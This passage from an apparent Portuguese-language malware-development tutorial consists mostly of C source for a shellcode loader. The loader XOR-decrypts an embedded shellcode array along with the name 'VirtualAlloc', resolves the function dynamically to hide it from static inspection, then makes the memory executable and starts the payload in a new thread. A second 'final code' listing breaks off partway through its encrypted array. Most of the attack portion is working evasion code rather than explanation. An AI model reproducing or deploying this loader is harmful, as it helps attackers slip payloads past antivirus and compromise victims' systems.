class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>

<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVA</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>

<span class="c1">// XOR encrypted da VirtualAlloc</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVA</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVALen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVA</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="c1">// deXOR da VirtualAlloc</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">cVA</span><span class="p">,</span> <span class="n">cVALen</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
    <span class="c1">// deXOR do shellcode</span>
    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>

    <span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="n">cVA</span><span class="p">);</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">pVA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>


    <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="n">rx</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Com isso, a <em>string</em> <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> não está mais presente no programa.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724155019.png" alt="" /></p><p>Seguindo os mesmos passos, faremos nas funções <code class="language-plaintext highlighter-rouge">VirtualProtect</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> e <code class="language-plaintext highlighter-rouge">RtlMoveMemory</code>. O código final fica da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x1a</span><span 